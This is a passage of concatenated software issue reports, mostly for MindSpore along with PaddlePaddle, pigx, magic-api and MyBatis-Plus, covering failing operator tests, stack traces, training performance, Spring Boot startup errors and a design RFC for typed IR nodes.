_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/unsorted_segment_prod_ops.py:98: in grad_cmp self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[1, 0], [0, 0], [0, 4]], dtype=uint8), data_me = array([[1, 0], [0, 0], [0, 0]], dtype=uint8), rtol = 0, atol = 0 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[4] E data_me_error:[0] E loss:[4] [ERROR] DEVICE(188938,ffffb2a37440,python3.7):2022-07-22-15:10:14.052.413 [mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_kernel_runtime.cc:643] TaskFailCallback] Execute TaskFailCallback failed. task_fail_info or current_graph_ is nullptr [ERROR] DEVICE(188938,ffffb2a37440,python3.7):2022-07-22-15:10:14.053.350 [mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_kernel_runtime.cc:643] TaskFailCallback] Execute TaskFailCallback failed. task_fail_info or current_graph_ is nullptr [ERROR] DEVICE(188938,ffffb2a37440,python3.7):2022-07-22-15:10:14.053.463 [mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_kernel_runtime.cc:1114] SyncStream] Call runtime rtStreamSynchronize error."
[CI][MS][doc] Example for MulNoNan is failed,": Ascend /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : https://www.mindspore.cn/docs/api/en/master/api_python/ops/mindspore.ops.MulNoNan.html?highlight=mulnonan#mindspore.ops.MulNoNan 直接在Ascend环境，执行 MulNoNan 测试样例，case1通过，case2失败，case3通过 case1、case3的本地执行结果符合预期，但case2的本地执行结果，出现nan case2的结果符合预期   <code>: 测试样例： # case 1 : same data type and shape of two inputs, there are some 0 in y. x = Tensor(np.array([[-1.0, 6.0, np.inf], [np.nan, -7.0, 4.0]]), mindspore.float32) y = Tensor(np.array([[-1.0, 4.0, 0], [0, -3.0, 1.0]]), mindspore.float32) mul_no_nan = ops.MulNoNan() output = mul_no_nan(x, y) print(output) # case 2 : the shape of two inputs is same, there are some 0 in x, y. x = Tensor(np.array([[-1.0, 6.0, 0], [0, np.nan, 4.0]]), mindspore.int32) y = Tensor(np.array([[-1.0, 4.0, np.inf], [np.nan, 0, 1.0]]), mindspore.float32) output = mul_no_nan(x, y) print(output) print(output.dtype) # case 3 : the y is a scalar. x = Tensor(np.array([[-1.0, 6.0, 0], [0, np.nan, 4.0]]), mindspore.float32) y = Tensor(0, mindspore.float32) output = mul_no_nan(x, y) print(output) 测试执行结果： (xue3.7) [root@localhost doc]# python aaa.py [[ 1. 24. 0.] [ 0. 21. 4.]] [[ 1. 24. nan] [nan 0. 4.]] Float32 [[0. 0. 0.] [0. 0. 0.]]"
按照视频新建了一个模块pixgx-demo，用拷贝pigx-codegen模块的方法新建的，改完配置之后启动时报错,pigx版本: 3.2 系统：windows10 是否二开: 否 是否修改包名: 是 按照视频新建了一个模块pixgx-demo，用拷贝pigx-codegen模块的方法新建的，把pigx-codegen拷贝到pigx主目录底下，然后把模块名修改为pigx-demo，按照视频16[1.x]Pigx新增微服务一 改完配置之后启动时报错 必须提供 必须提供   <code>: Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2019-08-31 02:58:59.358 ERROR 6852 --- [ main] o.s.b.d.LoggingFailureAnalysisReporter : *************************** APPLICATION FAILED TO START *************************** Description: Parameter 1 of constructor in com.pig4cloud.pigx.common.security.service.PigxUserDetailsServiceImpl required a bean of type 'org.springframework.cache.CacheManager' that could not be found. Action: Consider defining a bean of type 'org.springframework.cache.CacheManager' in your configuration.
[ST][MS][NET][resnet50-boost-imagenet][910 x86]FPS[16618] can not reach 26000,"[resnet50-boost-imagenet网络在910 x86环境训练，性能16618/fps达不到26000 / 硬件环境: /device ascend : -- MindSpore version :r1.7.0 commit_id:c492d3204 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : MindSpore编译时间：20220427190610 r1.7.0 commit_id:c492d3204 (/): /mode graph test_ms_resnet50_imagenet_boost_train_check_loss_910_8p_0003.py cd solution_test/cases/02network/00cv/resnet50/train pytest -s test_ms_resnet50_imagenet_boost_train_check_loss_910_8p_0003.py 网络训练成功，训练性能能达到26000/fps 走给安正气   <code>: epoch time: 349703.356 ms, per step time: 559.525 ms epoch time: 79612.512 ms, per step time: 127.380 ms epoch time: 82916.217 ms, per step time: 132.666 ms epoch time: 81800.708 ms, per step time: 130.881 ms epoch time: 79764.225 ms, per step time: 127.623 ms epoch time: 80444.587 ms, per step time: 128.711 ms epoch time: 80299.398 ms, per step time: 128.479 ms epoch time: 80318.150 ms, per step time: 128.509 ms epoch time: 80210.179 ms, per step time: 128.336 ms epoch time: 80385.474 ms, per step time: 128.617 ms epoch time: 79412.968 ms, per step time: 127.061 ms epoch time: 82557.316 ms, per step time: 132.092 ms epoch time: 81943.989 ms, per step time: 131.110 ms epoch time: 80098.289 ms, per step time: 128.157 ms epoch time: 79706.448 ms, per step time: 127.530 ms epoch time: 80589.205 ms, per step time: 128.943 ms epoch time: 80035.785 ms, per step time: 128.057 ms epoch time: 79544.362 ms, per step time: 127.271 ms epoch time: 81502.398 ms, per step time: 130.404 ms epoch time: 80864.943 ms, per step time: 129.384 ms epoch time: 80055.777 ms, per step time: 128.089 ms epoch time: 81254.867 ms, per step time: 130.008 ms epoch time: 80927.336 ms, per step time: 129.484 ms epoch time: 80774.329 ms, per step time: 129.239 ms epoch time: 82787.735 ms, per step time: 132.460 ms epoch time: 81498.058 ms, per step time: 130.397 ms epoch time: 82241.704 ms, per step time: 131.587 ms epoch time: 81312.131 ms, per step time: 130.099 ms epoch time: 83013.240 ms, per step time: 132.821 ms epoch time: 81631.654 ms, per step time: 130.611 ms epoch time: 62945.303 ms, per step time: 100.712 ms epoch time: 62280.703 ms, per step time: 99.649 ms epoch time: 61220.198 ms, per step time: 97.952 ms epoch time: 61476.289 ms, per step time: 98.362 ms epoch time: 62446.758 ms, per step time: 99.915 ms epoch time: 61834.898 ms, per step time: 98.936 ms epoch time: 62389.977 ms, per step time: 99.824 ms epoch time: 61399.844 ms, per step time: 98.240 ms epoch time: 61887.073 ms, per step time: 99.019 ms epoch time: 62904.147 ms, per step time: 100.647 ms epoch time: 62324.222 ms, per step time: 99.719 ms epoch time: 62202.109 ms, per step time: 99.523 ms epoch time: 62139.495 ms, per step time: 99.423 ms epoch time: 61263.669 ms, per step time: 98.022 ms epoch time: 63630.223 ms, per step time: 101.808 ms epoch time: 61815.970 ms, per step time: 98.906 ms epoch time: 62290.317 ms, per step time: 99.665 ms epoch time: 62648.353 ms, per step time: 100.237 ms epoch time: 62961.094 ms, per step time: 100.738 ms epoch time: 61691.244 ms, per step time: 98.706 ms epoch time: 61174.371 ms, per step time: 97.879 ms epoch time: 61345.928 ms, per step time: 98.153 ms epoch time: 61929.191 ms, per step time: 99.087 ms epoch time: 63451.365 ms, per step time: 101.522 ms epoch time: 61547.692 ms, per step time: 98.476 ms epoch time: 62554.746 ms, per step time: 100.088 ms epoch time: 61819.518 ms, per step time: 98.911 ms epoch time: 61485.806 ms, per step time: 98.377 ms epoch time: 61707.611 ms, per step time: 98.732 ms epoch time: 61054.645 ms, per step time: 97.687 ms"
现在兼容springboot3.0么，使用3.0版本，访问404,当前使用版本 使用3.0.1版本spiring boot 访问web，显示404 重现步骤（如果有就写完整）   <code>: &lt;dependency&gt; &lt;groupId&gt;org.ssssssss&lt;/groupId&gt; &lt;artifactId&gt;magic-api-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt; &lt;/dependency&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt;
Bad unit test,"Our total CI time is exceeding <em>one hour</em>! And requires over <em>50GB memory</em>!! Most time was spent on running unit tests. Many unit tests are taking a lot of time: While I am looking into , I noticed some MUST-NOT code: Random Inputs Randomness is the reason that sometimes our CI fails but once clicked ""Restart"" it passes magically. Randomness is only reasonable when any random input should pass the test. But the following code snippet doesn't fall in this case: The last line could cause random exception, because calls , and , the maximum element in could be 0! Combinatorial test Here is an example Such combinatorial tests are USELESS and it makes unti test looks like load test.   <code>: [Step 1/1] 101/106 Test #34: test_matrixCompare .................. Passed 323.75 sec [18:27:04][Step 1/1] 102/106 Test #105: test_ploter ......................... Passed 177.24 sec [18:27:18][Step 1/1] 103/106 Test #104: reader_tests ........................ Passed 204.94 sec [18:27:36][Step 1/1] 104/106 Test #103: test_v2_api ......................... Passed 237.67 sec [18:28:07][Step 1/1] 105/106 Test #106: test_framework ...................... Passed 182.24 sec test_matrixCompare IVectorPtr cpuSequence; generateSequenceStartPositions(batchSize, cpuSequence); size_t numSeq = cpuSequence-&gt;getSize() - 1; size_t maxSeqLen = *std::max_element(cpuSequence-&gt;getData(), cpuSequence-&gt;getData() + numSeq); MatrixPtr cBatch = std::make_shared&lt;CpuMatrix&gt;(numSeq * maxSeqLen, inputDim); generateSequenceStartPosition uniformRandom maxSeqLen cpuSequence TEST(Matrix, mul) { for (auto transa : {false, true}) { for (auto transb : {false, true}) { for (auto dimM : {1, 9, 53, 127, 345, 1023, 2135}) { for (auto dimN : {1, 5, 37, 256, 1024}) { for (auto dimK : {8, 45, 346, 784, 1025}) { if (true == transa &amp;&amp; true == transb) { continue; } VLOG(3) &lt;&lt; setiosflags(ios::left) &lt;&lt; setfill(' ') &lt;&lt; "" transa="" &lt;&lt; transa &lt;&lt; "" transb="" &lt;&lt; transb &lt;&lt; "" dimM="" &lt;&lt; setw(5) &lt;&lt; dimM &lt;&lt; "" dimN="" &lt;&lt; setw(5) &lt;&lt; dimN &lt;&lt; "" dimK="" &lt;&lt; setw(5) &lt;&lt; dimK; testMatrixMul(transa, transb, dimM, dimN, dimK); testSubMatrixMul(transa, transb, dimM, dimN, dimK); } } } } } }"
[CT][MS][Function][heterogeneous] ApplyMomentum not support add primitive to CPU,": /device cpu : -- MindSpore version : 0.3.0 -- Python version : 3.7.5 -- OS platform and distribution : Linux eulerosv2r8.aarch64 -- GCC/Compiler version : 7.3.0 pytest -s test_heterogeneous_execution.py::test_heterogeneous_execution_lenet_train ApplyMomentum set context Ascend support add primitive to CPU   <code>: def lenet_train_tensor_add_prim_attr_to_cpu(self): input = Tensor(self.input_np) label = Tensor(self.label_np) net = LeNet5() loss = SoftmaxCrossEntropyWithLogits(is_grad=False, sparse=True) opt = Momentum(learning_rate=0.1, momentum=0.9, params=net.trainable_params()) opt.opt.add_prim_attr(""primitive_target"", ""CPU"") net_with_criterion = WithLossCell(net, loss) train_network = TrainOneStepCell(net_with_criterion, opt) train_network.set_train() for i in range(self.epoch_size): train_network(input, label) output = net(input) return output.asnumpy() def test_heterogeneous_execution_lenet_train(): fact = netFactory() out_device = fact.lenet_train_tensor() &gt; out_heter = fact.lenet_train_tensor_add_prim_attr_to_cpu() test_heterogeneous_execution.py:1044: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ test_heterogeneous_execution.py:421: in lenet_train_tensor_add_prim_attr_to_cpu train_network(input, label) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/nn/cell.py:203: in __call__ out = self.compile_and_run(*inputs) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/nn/cell.py:402: in compile_and_run _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._Executor object at 0xffff8e8c6890&gt; obj = TrainOneStepCell&lt; (network): WithLossCell&lt; (_backbone): LeNet5&lt; (conv1): Conv2d&lt;input_channels=1, output_c... (flatten): Flatten&lt;&gt; &gt; (_loss_fn): SoftmaxCrossEntropyWithLogits&lt;&gt; &gt; (optimizer): Momentum&lt;&gt; &gt; phase = '0train.1592373166431793920', params = None, do_convert = True, auto_parallel_mode = False def compile(self, obj, *args, phase='predict', params=None, do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. params (OrderedDict): The parameters dictionary used for init data graph. Default: None. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.check_names() args_names, args_list = _generate_pip_args(obj, *args) dic = dict(zip(args_names, args_list)) key = generate_key(phase, dic) self.phase_prefix = str(key[1]) if phase == 'export': phase = phase + '.' + str(obj.create_time) else: phase = self.phase_prefix + phase + '.' + str(obj.create_time) enable_debug_runtime = context.get_context(""enable_debug_runtime"") enable_ge = context.get_context(""enable_ge"") use_vm = not enable_ge or (enable_debug_runtime and context.get_context(""mode"") == context.PYNATIVE_MODE) self._set_dataset_mode(args_list) if phase in self.compile_cache.keys(): logger.debug(""%r graph has existed."", phase) return phase, False &gt; result = self._executor.compile(obj, args_list, phase, use_vm) E RuntimeError: mindspore/ccsrc/device/cpu/kernel_select_cpu.cc:75 GetOutputFormatsAndDtypes] Output num is not equal! /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/common/api.py:417: RuntimeError"
生成js文件时$字符无法转义？,这样的会报错   <code>: $refs['xxx'] $xxx.xxx()
请问swagger授权如何登录？请求返回401,"pig版本: 3.4.2 是否修改包名: 否 浏览器打开：http://pig-gateway:9999/swagger-ui/index.html 点击Authorize按钮，输入：admin/123456/test/test 点击Authorize按钮，返回401 另外，我在8080端口登录时，发现验证码出不来，直接打开图片地址提示： 可是我测试了，通过pig-redis可以访问redis服务器   <code>: {""code"":1,""msg"":""Unable to connect to Redis; nested exception is io.lettuce.core.RedisConnectionException: Unable to connect to pig-redis:6379"",""data"":null}"
[CT][MS][OCCM][Dist] The grad of dist have accuracy error when input with large shape.,"The grad of dist have accuracy error when input with large shape The grad of dist have accuracy error when input with large shape / 硬件环境: /device ascend/GPU/CPU/ : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 交付件ops文件没有测试到参数p，p的测试是后来加的 Ascend结果误差较大 CPU\GPU结果为nan   <code>: def test_functional_dist_4d_float16(): input_x = Tensor(np.random.uniform(-100, 100, (1024, 1, 512, 2)).astype(np.float16)) input_y = Tensor(np.random.uniform(-100, 100, (1024, 1, 512, 2)).astype(np.float16)) p = 5 input_list = [input_x, input_y, p] fact = DistMock(inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_functional_dist_4d_float16(): input_x = Tensor(np.random.uniform(-100, 100, (1024, 1, 512, 2)).astype(np.float16)) input_y = Tensor(np.random.uniform(-100, 100, (1024, 1, 512, 2)).astype(np.float16)) p = 5 input_list = [input_x, input_y, p] fact = DistMock(inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_f_dist.py:100: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/funcational/dist_ops.py:82: in grad_cmp allclose_nparray(data_expected, data_me, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[-4.172e-07, 5.960e-08], [-0.000e+00, 1.788e-07], [ 2.909e-05, 1.192e-06], ...,... [ 4.172e-07, 5.960e-08], [-6.557e-07, -6.735e-06], [ 1.389e-05, -2.050e-05]]]], dtype=float16) data_me = array([[[[-5.308e-01, 5.308e-01], [-5.308e-01, 5.308e-01], [ 5.308e-01, 5.308e-01], ...,... [ 5.308e-01, 5.308e-01], [-5.308e-01, -5.308e-01], [ 5.308e-01, -5.308e-01]]]], dtype=float16) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-4.17e-07 5.96e-08 -0.00e+00 ... -6.74e-06 1.39e-05 -2.05e-05] E data_me_error:[-0.531 0.531 -0.531 ... -0.531 0.531 -0.531] E loss:[0.531 0.531 0.531 ... 0.531 0.531 0.531] def test_functional_dist_4d_float16(): input_x = Tensor(np.random.uniform(-100, 100, (1024, 1, 512, 2)).astype(np.float16)) input_y = Tensor(np.random.uniform(-100, 100, (1024, 1, 512, 2)).astype(np.float16)) p = 5 input_list = [input_x, input_y, p] fact = DistMock(inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_f_dist.py:100: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/funcational/dist_ops.py:82: in grad_cmp allclose_nparray(data_expected, data_me, self.loss, self.loss) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[ 1.669e-06, -0.000e+00], [-0.000e+00, 4.172e-07], [-0.000e+00, 3.934e-06], ...,... [-3.994e-06, 0.000e+00], [ 5.960e-08, 0.000e+00], [-1.490e-06, 0.000e+00]]]], dtype=float16) data_me = array([[[[nan, nan], [nan, nan], [nan, nan], ..., [nan, nan], [ 0., nan],...n], [nan, nan], ..., [nan, 0.], [nan, 0.], [nan, nan]]]], dtype=float16) rtol = 0.001, atol = 0.001, equal_nan = True def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)) or np.any(np.isnan(data_me)): &gt; assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) E AssertionError"
"""Typed""-Tag Indicating well-typedness of a whole subtree for Type Preserving","RFC Introduce ""Typed"" Tag Infrastructure to indicate a subtree/range of node is typed kind/enhancement We are trying to move to the idea of type-preserving program transformation/passes, but we don't even have the idea to know a group of nodes are typed or not On the Metalangauge(C++) Type Level, we don't have the distinction between untyped and typed Node in Target Language (ME); we can not utils the C++ compiler's static type checking to help us the current strategy is a simple , which only ensure the type-annotation of one node instead of a subtree/range of nodes With that, we can have typed IRBuilder and un-typed IRBuilder at the same time, simply distinguish by the metalanguage's type Related RFC #I1DR74:Add a checking mechanism for the need of Renormalize pass in Parse pipeline Introduces a simple template and use C++'s explicit full type specialization. We define the semantic of that ""all the subtree in a are , (i.e.) "". We also define a convention that (i.e. is always an inherited class from ) We ensure the semantic by explicitly restricting the constructor of and to check the not null or giving type explicitly; the constructor of Typed will have to ensure each of are instances of . Also several util functionalities should be introduced: will return an untyped node corresponding to the given , but its children will still be typed will return an untyped tree corresponding to the given we need work a lot on and because ultimately is a covariant template, but the compiler cannot know . It is also possible to brutally make as a parent of by using multiple inheritance, but it will introduce a lot of problem. Idea is that though C++ compiler doesn't know the inheritance relationship, we can modify a bit to let it know during runtime. There is also idea on how to construct a co-variant template we can refer to We need the runtime information for the ME compiler to know which part are typed and which are not. That's the functionality of and . an interface in is necessary There are several advantages to it: <em>Non-intrusive</em> for the current passes: Because is conventionally always a subclass of , the current passes working on untyped node, for example, the series of , can still work when is passed in. Since we can have untyped node with typed subtree as children <em>Extensible</em> tag gives a unified interface and is open to extending all sorts of IR structure in the future; also is not fixed to one particular type system. Its real meaning is a given subtree has everywhere type annotated <em>Helpful for Local Type Inference</em>. If can handle the functionality as typechecking (in , it will check the input function node and other argument nodes have consistent type), then typed IRBuilder only needs to extend with the functionality of . When given untyped node in typed context, IRBuilder will try to infer the type and give ""Typed&lt;&gt;"" to check. To construct a new ""Typed"" node, it requires constant time (for a whole tree, amortized constant). It directly relates to @kungsen 's idea in #I1DR74:Add a checking mechanism for the need of Renormalize pass in Parse pipeline . In his note, Choice 1 is directly reflecting the property of , Choice 2 is directly related to the typed IRBuilder This has very good compatibility with Immutable style IRMutator/passes. This has a good enough compatibility with mutable style IRMutator. For both Visitor style and direct-mutation-on-manager style (taken out all the nodes and in-place mutate), as long as the changed new ANFNode subtree has the same type as the old correspondence, which is most of the case happening in the local optimizer. After an intensive discussion with @thlinh and @kaitingwang , we find out this infrastructure is really helpful for #I1DR74:Add a checking mechanism for the need of Renormalize pass in Parse pipeline because of the nature of IRMutator. When IRMutator doing any mapping/(mutation by creating a new tree), the returned tree could be very large because it attaches to the existent subnode. A linear check at that time is not acceptable, especially when the subtree could be very large. For example, arithemetic_simplifier will return when encountering . In this case, tag gives a good annotation and amortize the complexity. ""Typed&lt;&gt;"" Tag is ultimately a strong induction that gives compiler more proof/evidence which part is already typed and which part are unsure. There are also some challenges: / are not encouraged -- when those two happens, the input node will be checked if type annotation is around. If not, then some error/exception/(mechanism that can stop the current control flow) must be invoked. The ultimate reason is the interface of return void and doing in-place mutation; but in-place typecasting is not possible (from Typed to raw X); a good relief might be the fact that we provide interface to relax the type-check, but the fact that a pointer to X could be pointing to Typed still brings problem (the user might not know he is actually using Typed, and thus don't know he should transform to raw X). We can first avoid those using / passes Although inplace-mutation of to raw is not possible, we are using pointer (to the CNode) to invoke these two methods most of the time, a change of the pointer's object might be possible. might be totally abandoned -- because (f : int -&gt; int -&gt; int) and (f x : int -&gt; int) and (f x y : int) are totally different type of tree, in-place mutation as will change the current top-node to different type; but the current top-node might be a child of other typed tree. is okay to make up, we can have a immutable-style , where it will not in-place mutate but return a new-node with different type. Trail No. Task Description Related Issue(URL) 1 2   <code>: x -&gt; abstract() != null Typed&lt;&gt; Typed&lt;AnfNode&gt; Typed&lt;&gt; -&gt;abstract() != nullptr Typed&lt;X&gt; &lt;: X Typed&lt;X&gt; X Typed&lt;Parameter&gt; Typed&lt;ValueNode&gt; -&gt;abstract() input() Typed&lt;AnfNode&gt; template&lt;typename X&gt; struct Typed : X {}; // This dummy template is only to indicate the subclass is happening // and document all the general interface Typed&lt;&gt; can support // maybe we should static error it during compilation to stop this dummy ever being used template&lt;&gt; struct Typed&lt;AnfNode&gt; : public AnfNode {...}; template&lt;&gt; struct Typed&lt;CNode&gt; : public CNode {..}; template&lt;&gt; struct Typed&lt;Parameter&gt; : public Parameter {..} // ... In the future, if necessary, Typed&lt;&gt; can be applied to FuncGraph and ANode underlying-node Typed&lt;&gt; underlying-tree Typed&lt;&gt; Typed&lt;&gt;::isa&lt;&gt; Typed&lt;&gt;::cast&lt;&gt; Typed&lt;&gt; Typed&lt;CNode&gt; &lt;: Typed&lt;AnfNode&gt; Typed&lt;AnfNode&gt; Typed&lt;CNode&gt; isa isa cast istyped AnfNode Typed&lt;X&gt; X Substitution Typed&lt;AnfNode&gt; Typed&lt;&gt; Typed&lt;&gt; Typed CNode Trivial Type Inference Typed (A VERY LARGE TREE) (A VERY LARGE TREE) + 0 Typed add_input set_input add_input underlying_node add_input set_input Typed&lt;X&gt; X add_input add_input set-input add_input"
ParallelDo with MKLDNN,"In MKLDNN convolution (PR #8451:Fix dist demo var type error) I need to send some data from forward to backward functions. I'm saving it into . It works well as long as I'm not running it in mode. In , method is called in different threads simuleanously with same DeviceContext, which is failing obviously because of memory access failures. How could I transport data from forward do backward safely? I think that running MKLDNN methods in parallel doesn't make sense, because MKLDNN uses internally OpenMP for parallel computations. For CPU place Paddle takes as many cores as possible: https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/fluid/operators/get_places_op.cc#L51. We could change it so that when using MKLDNN, it would use only one device. But on the other hand, it won't be effective when we'll have both MKLDNN and GPU/Plain-CPU operators. It would be best if we could define for each OP separately, but I don't know if it makes sense in the context of whole platform. Any thoughts?   <code>: Compute DeviceContext ParallelDo ParallelDo Compute Compute device_count"
[CT][MS][doc]convert_to_thor_model and thor api example test fail at gpu,": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : open link, https://www.mindspore.cn/doc/api_python/zh-CN/master/mindspore/nn/mindspore.nn.thor.html?highlight=thor#mindspore.nn.thor open link, https://www.mindspore.cn/doc/api_python/zh-CN/master/mindspore/mindspore.train.html?highlight=convert_to_thor_model#mindspore.train.train_thor.ConvertModelUtils.convert_to_thor_model 执行以上两个接口里的样例 两个样例全部执行失败 1.lr, model等没有定义 lr, damping， loss没有定义 样例执行pass   <code>: def test_thor(): from mindspore.nn.optim import thor from mindspore.train.model import Model from mindspore.train.loss_scale_manager import FixedLossScaleManager from mindspore.train.callback import LossMonitor, TimeMonitor net = Net() &gt; optim = thor(net, lr=Tensor(1e-3), damping=Tensor(1e-3), momentum=0.9) E TypeError: thor() got an unexpected keyword argument 'lr' def test_convert_to_thor_model(): from mindspore.nn.optim import thor from mindspore.train.model import Model from mindspore.train.loss_scale_manager import FixedLossScaleManager net = Net() loss_manager = FixedLossScaleManager(128, drop_overflow_update=False) &gt; opt = thor(net, lr, damping, momentum=0.9, weight_decay=1e-4, loss_scale=128, batch_size=32, frequency=100) E NameError: name 'lr' is not defined"
"条件构造器Wrapper 默认别名是ew,没有暴露修改的方法。如果用注解 @Param(""ews"")给Wrapper起一个别名ews。则报错。","当前使用版本 V3.3.2 问题 1、条件构造器Wrapper 默认别名是ew,没有暴露修改的方法，MP2.X是有提供setParamAlias函数修改的。 问题 2、由问题 1 引起以下问题： 如果用注解 @Param(""ews"")给Wrapper起一个别名ews。则报错。 错误信息：BindingException: Parameter 'ew' not found. Available parameters are [ews, param1]； 问题 3、由问题 1 因引起以下问题： 如果有复杂sql，可能需要两个条件构造器，其中一个起名为ew,另外一个条件构造器，起一个别名ews。因为问题1的原因，ews的列取值是ew中的值。 问题 2 重现步骤如图：   <code>: org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.binding.BindingException: Parameter 'ew' not found. Available parameters are [ews, param1] at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:92) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:440) at com.sun.proxy.$Proxy144.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:223) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForIPage(MybatisMapperMethod.java:134) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:96) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:96) at com.sun.proxy.$Proxy149.getDataDictInfoPageList(Unknown Source) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:344) at 